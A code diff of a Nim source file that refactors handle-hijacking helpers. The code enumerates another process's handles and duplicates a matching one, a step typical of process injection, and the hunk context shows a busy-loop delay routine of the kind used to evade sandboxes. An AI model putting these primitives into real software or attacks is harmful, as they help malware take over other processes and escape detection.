@@ -1,16 +1,4 @@
 include defs
-import math
-import times 
-import random
-
-
-proc `+`*[S: SomeInteger](p: pointer, offset: S): pointer =
-    return cast[pointer](cast[ByteAddress](p) +% int(offset))
-
-
-proc toString*(bytes: openarray[byte]): string =
-    result = newString(bytes.len)
-    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 
 proc toString*(chars: openArray[WCHAR]): string =
@@ -70,51 +58,51 @@ proc sleepUselessCalculations*(secondsToSleep: int) =
             y = sqrt(float(x * y + 37)) * sqrt(float(x / (y + 1111))) + exp(float(x * z))
 
 
-proc ntQueryObjectWrapper(x: HANDLE, y: OBJECT_INFORMATION_CLASS): ptr BYTE =
-    var InformationLength: ULONG = 0
-    var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
-    var Information: pointer
-    while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
-        Information = realloc(Information, InformationLength)
-        Ntstatus = NtQueryObject(x, y, Information, InformationLength, addr InformationLength)
-    return cast[PBYTE](Information)
+proc ntQueryObjectWrapper(handle: HANDLE, oic: OBJECT_INFORMATION_CLASS): ptr BYTE =
+    var informationLength: ULONG = 0
+    var ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
+    var information: pointer
+    while ntstatus == STATUS_INFO_LENGTH_MISMATCH:
+        information = realloc(information, informationLength)
+        ntstatus = NtQueryObject(handle, oic, information, informationLength, addr informationLength)
+    return cast[PBYTE](information)
 
 
-proc hijackProcessHandle*(wsObjectType: PWSTR, p_hTarget: HANDLE, dwDesiredAccess: DWORD): HANDLE =
-    var InformationLength: ULONG = 0
-    var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
-    var Information: pointer
-    while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
-        Information = realloc(Information, InformationLength)
-        Ntstatus = NtQueryInformationProcess(
-            p_hTarget, 
+proc hijackProcessHandle*(objectType: PWSTR, targetHandle: HANDLE, desiredAccess: DWORD): HANDLE =
+    var informationLength: ULONG = 0
+    var ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
+    var information: pointer
+    while ntstatus == STATUS_INFO_LENGTH_MISMATCH:
+        information = realloc(information, informationLength)
+        ntstatus = NtQueryInformationProcess(
+            targetHandle, 
             PROCESS_HANDLE_INFORMATION,
-            Information, 
-            InformationLength, 
-            addr InformationLength
+            information, 
+            informationLength, 
+            addr informationLength
         )
-    let pProcessHandleInformation = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](Information)
-    var p_hDuplicatedObject: HANDLE
-    for i in 1 ..< int(pProcessHandleInformation.NumberOfHandles):
+    let processHandleInformation = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](information)
+    var duplicatedHandle: HANDLE
+    for i in 1 ..< int(processHandleInformation.NumberOfHandles):
         # handle struct pointer = first handle struct address + sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * iterator
         var handlePtr = cast[PPROCESS_HANDLE_TABLE_ENTRY_INFO](
-            cast[int](addr pProcessHandleInformation.Handles[0]) + 
+            cast[int](addr processHandleInformation.Handles[0]) + 
             sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * i
             )
         if DuplicateHandle(
-            p_hTarget, 
+            targetHandle, 
             handlePtr.HandleValue, 
             GetCurrentProcess(),
-            addr p_hDuplicatedObject, 
-            dwDesiredAccess,
+            addr duplicatedHandle, 
+            desiredAccess,
             false, 
             0
         ) == 0:
             continue
-        let pObjectInformation = ntQueryObjectWrapper(p_hDuplicatedObject, OBJECT_TYPE_INFORMATION)
-        let pObjectTypeInformation = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](pObjectInformation)
-        if pObjectInformation == nil:
+        let objectInformation = ntQueryObjectWrapper(duplicatedHandle, OBJECT_TYPE_INFORMATION)
+        let objectTypeInformation = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](objectInformation)
+        if objectInformation == nil:
             continue 
-        if $wsObjectType == $pObjectTypeInformation.TypeName.Buffer:
-            return p_hDuplicatedObject
+        if $objectType == $objectTypeInformation.TypeName.Buffer:
+            return duplicatedHandle
 
